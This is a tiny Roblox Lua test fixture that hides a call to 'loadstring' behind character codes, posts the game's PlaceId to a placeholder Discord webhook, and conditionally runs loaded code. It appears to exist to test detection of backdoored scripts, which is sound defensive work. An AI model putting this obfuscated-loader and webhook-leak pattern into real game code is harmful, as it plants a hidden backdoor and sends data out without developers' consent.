-- TEST FIXTURE. Encoded loader plus webhook leak.
local H = game:GetService("HttpService")
local f = getfenv()[string.char(108,111,97,100,115,116,114,105,110,103)]
H:PostAsync("https://discord.com/api/webhooks/000/fixture", H:JSONEncode({ place = game.PlaceId }))
if game.CreatorId == 0 then f("print(1)")() end
